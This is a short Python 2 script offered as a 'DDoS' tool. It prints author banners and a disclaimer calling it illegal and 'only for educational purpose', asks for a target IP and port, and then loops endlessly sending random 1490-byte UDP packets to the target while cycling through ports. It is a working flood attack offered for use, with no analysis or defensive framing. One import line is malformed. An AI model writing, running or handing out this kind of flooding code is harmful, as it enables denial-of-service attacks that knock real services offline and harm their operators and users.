print ()
import "sys"
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet Vip-DdoS")
print
print "Coded By : Mr.KrishnaGuptajii"
print "Author   : KrishnaGuptajii"
print "Github   : github.com/GuptajiiHacker"
print "Fb Page  : facebook.com/KrishnaGupta"
print "Instagram : Instagram.com/Its_Vip_Krishna_Gupta"
print "Telegram : t.me/VipHacker"
print " Use it on your own Risk@Vip"
print "Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We'll Be Not Responsible For Kind Of Problems@VipKrishna"
print
ip = raw_input("IP address Target : ")
port = input("IP Port       : ")
os.system("clear")
print("\033[93m")
os.system("figlet VIP DdoS Attack")
print("Coded by : HackerGuptajii")
print ("\033[92m")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

